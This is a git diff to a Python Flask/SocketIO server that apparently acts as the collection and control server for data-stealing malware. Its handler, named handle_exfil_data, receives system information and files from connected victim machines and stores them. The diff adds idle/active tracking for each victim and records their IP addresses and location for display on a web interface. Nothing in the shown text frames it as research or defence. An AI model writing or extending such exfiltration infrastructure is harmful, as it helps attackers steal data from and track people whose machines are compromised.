@@ -6,7 +6,7 @@ from flask import Flask, render_template, request, send_from_directory, jsonify
 from flask_socketio import SocketIO, emit
 from werkzeug.utils import secure_filename
 import base64
-
+import time
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret!'
@@ -22,8 +22,9 @@ for folder in [app.config['UPLOAD_FOLDER'], app.config['DOWNLOAD_FOLDER']]:
 # Track connected clients
 connected_clients = set()
 
-# Store client info
+# Store client info and activity
 client_info = {}
+client_activity = {}
 
 def get_files():
     """List all files in the upload folder."""
@@ -90,6 +91,7 @@ def handle_connect():
     """Handle new client connections."""
     client_id = request.sid
     connected_clients.add(client_id)
+    client_activity[client_id] = {"last_active": time.time(), "status": "active"}
     print(f"[*] Client connected: {client_id}")
     emit('client_update', list(connected_clients), broadcast=True)
 
@@ -100,6 +102,7 @@ def handle_disconnect():
     if client_id in connected_clients:
         connected_clients.remove(client_id)
         client_info.pop(client_id, None)
+        client_activity.pop(client_id, None)
         print(f"[*] Client disconnected: {client_id}")
         emit('client_update', list(connected_clients), broadcast=True)
 
@@ -110,6 +113,15 @@ def handle_exfil_data(data):
     data = json.loads(data)
     data_type = data.get('type')
 
+    # Update activity status
+    client_activity[client_id]["last_active"] = time.time()
+    current_time = time.time()
+    for cid, activity in client_activity.items():
+        if current_time - activity["last_active"] > 30:  # Idle after 30 seconds
+            activity["status"] = "idle"
+        else:
+            activity["status"] = "active"
+
     if data_type == "system_info":
         username = data.get('system', {}).get('username', None)
         if not username:
@@ -117,6 +129,8 @@ def handle_exfil_data(data):
         else:
             client_info[client_id] = data.get('system', {})
             client_info[client_id]['username'] = username
+            client_info[client_id]['ip_addresses'] = data.get('network', {}).get('ip_addresses', [])
+            client_info[client_id]['location'] = data.get('network', {}).get('location', 'Unknown')
         timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
         filename = f"{client_id}_{timestamp}_sysinfo.json"
         filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
@@ -192,13 +206,13 @@ def handle_exfil_data(data):
         print(f"[*] Received file {filename} from client {client_id}")
 
     # Emit updated client info
-    client_info_list = [{'id': cid, 'system': info} for cid, info in client_info.items()]
+    client_info_list = [{'id': cid, 'system': info, 'activity': client_activity.get(cid, {'status': 'idle'})} for cid, info in client_info.items()]
     emit('client_info', client_info_list, broadcast=True)
 
 @socketio.on('request_client_info')
 def handle_request_client_info():
     """Handle requests for client info from the web interface."""
-    client_info_list = [{'id': cid, 'system': info} for cid, info in client_info.items()]
+    client_info_list = [{'id': cid, 'system': info, 'activity': client_activity.get(cid, {'status': 'idle'})} for cid, info in client_info.items()]
     emit('client_info', client_info_list)
 
 if __name__ == "__main__":
